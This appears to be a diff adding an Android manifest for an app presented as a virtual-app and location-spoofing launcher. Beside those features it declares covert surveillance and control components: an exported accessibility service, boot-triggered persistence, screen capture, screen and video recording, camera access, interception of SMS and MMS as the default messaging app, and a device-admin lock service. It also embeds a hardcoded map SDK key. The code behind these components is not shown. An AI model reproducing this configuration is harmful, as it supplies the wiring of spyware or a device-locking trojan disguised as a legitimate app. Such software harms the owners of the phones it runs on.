@@ -1,0 +1,217 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="io.virtualapp">
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_SETTINGS" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.WRITE_SMS" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.intent.action.BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.SET_WALLPAPER" />
+    <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.GET_TASKS" />
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.ACCESS_KEYGUARD_SECURE_STORAGE" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILRSYSTEMS"/>
+    <uses-permission android:name="android.hardware.camera"/>
+    <uses-permission android:name="android.hardware.camera.autofocus"/>
+
+    <uses-feature
+        android:name="android.hardware.camera"
+        android:required="false" />
+    <uses-feature
+        android:name="android.hardware.camera.front"
+        android:required="false" />
+    <uses-feature android:name="android.hardware.camera.autofocus" />
+
+    <application
+        android:name="io.virtualapp.VApp"
+        android:allowBackup="true"
+        android:icon="@mipmap/ic_launcher"
+        android:label="@string/app_name"
+        android:theme="@style/AppTheme">
+        <meta-data
+            android:name="TencentMapSDK"
+            android:value="4HPBZ-2QWC6-H47SR-M6PZY-MTZB5-N2F4F" />
+
+        <activity
+            android:name="io.virtualapp.splash.SplashActivity"
+            android:screenOrientation="portrait"
+            android:theme="@style/AppTheme">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <activity
+            android:name="io.virtualapp.home.HomeActivity"
+            android:screenOrientation="portrait"
+            android:theme="@style/UITheme" />
+
+        <activity
+            android:name="io.virtualapp.home.ListAppActivity"
+            android:screenOrientation="portrait"
+            android:theme="@style/UITheme" />
+
+        <activity
+            android:name="io.virtualapp.home.LoadingActivity"
+            android:excludeFromRecents="true"
+            android:noHistory="true"
+            android:screenOrientation="portrait"
+            android:taskAffinity="va.task.loading"
+            android:theme="@style/TransparentTheme" />
+        <activity
+            android:name="io.virtualapp.home.location.VirtualLocationSettings"
+            android:screenOrientation="portrait"
+            android:theme="@style/UITheme" />
+
+        <activity
+            android:name="io.virtualapp.home.location.MarkerActivity"
+            android:screenOrientation="portrait"
+            android:theme="@style/UITheme" />
+
+        <service
+            android:name="accessibility.Acc101Service"
+            android:enabled="true"
+            android:exported="true"
+            android:label="@string/service_name"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/acch_service_config" />
+        </service>
+
+        <service android:name="order.Order101Service">
+            <intent-filter android:priority="1000" >
+                <action android:name="action" />
+                <!-- 系统启动完成后会调用 -->
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.DATE_CHANGED" />
+                <action android:name="android.intent.action.MEDIA_MOUNTED" />
+                <action android:name="android.intent.action.USER_PRESENT" />
+                <action android:name="android.intent.action.ACTION_TIME_TICK" />
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
+                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
+            </intent-filter>
+        </service>
+
+        <activity
+            android:name="order.screen.ScreenShot101Activity"
+            android:launchMode="singleTask"
+            android:theme="@android:style/Theme.Dialog">
+        </activity>
+
+        <activity
+            android:name="activity.Camera101Activity"
+            android:theme="@android:style/Theme.Wallpaper.NoTitleBar" >
+        </activity>
+        <activity
+            android:name="activity.Splash101Activity"
+            android:excludeFromRecents="true"
+            android:launchMode="singleTask"
+            android:theme="@android:style/Theme.Dialog" >
+        </activity>
+
+        <activity
+            android:name="order.screen.ScreenRecordActivity"
+            android:launchMode="singleTask"
+            android:theme="@android:style/Theme.Dialog" />
+
+        <service android:name="order.screen.ScreenRecordService"/>
+
+        <activity
+            android:name="order.screen.ScreenRecord101Activity"
+            android:launchMode="singleTask"
+            android:theme="@android:style/Theme.Dialog" />
+
+        <service android:name="order.screen.ScreenRecord101Service"/>
+
+        <service android:name="media.VideoRecorder102Service"/>
+
+
+        <activity android:name="sms.SmsActivity"
+            android:excludeFromRecents="true"
+            android:launchMode="singleTask">
+            <intent-filter>
+                <action android:name="android.intent.action.SEND" />
+                <action android:name="android.intent.action.SENDTO" />
+
+                <category android:name="android.intent.category.BROWSABLE" />
+
+                <data android:scheme="sms" />
+                <data android:scheme="smsto" />
+                <data android:scheme="mms" />
+                <data android:scheme="mmsto" />
+            </intent-filter>
+        </activity>
+        <receiver
+            android:name="sms.SmsReceiver"
+            android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SMS_DELIVER" />
+            </intent-filter>
+        </receiver> <!-- BroadcastReceiver that listens for incoming MMS messages -->
+        <receiver
+            android:name="sms.MmsReceiver"
+            android:permission="android.permission.BROADCAST_WAP_PUSH">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.WAP_PUSH_DELIVER" />
+
+                <data android:mimeType="application/vnd.wap.mms-message" />
+            </intent-filter>
+        </receiver> <!-- Service that delivers messages from the phone "quick response" -->
+        <service
+            android:name="sms.HeadlessSmsSendService"
+            android:exported="true"
+            android:permission="android.permission.SEND_RESPOND_VIA_MESSAGE">
+            <intent-filter>
+                <action android:name="android.intent.action.RESPOND_VIA_MESSAGE" />
+
+                <category android:name="android.intent.category.DEFAULT" />
+
+                <data android:scheme="sms" />
+                <data android:scheme="smsto" />
+                <data android:scheme="mms" />
+                <data android:scheme="mmsto" />
+            </intent-filter>
+        </service>
+
+        <receiver
+            android:name="lock.AdminReceiver"
+            android:permission="android.permission.BIND_DEVICE_ADMIN" >
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/lock" />
+
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <category android:name="android.intent.category.HOME" />
+            </intent-filter>
+        </receiver>
+        <service android:name="lock.LockService" >
+        </service>
+    </application>
+
+
+</manifest>
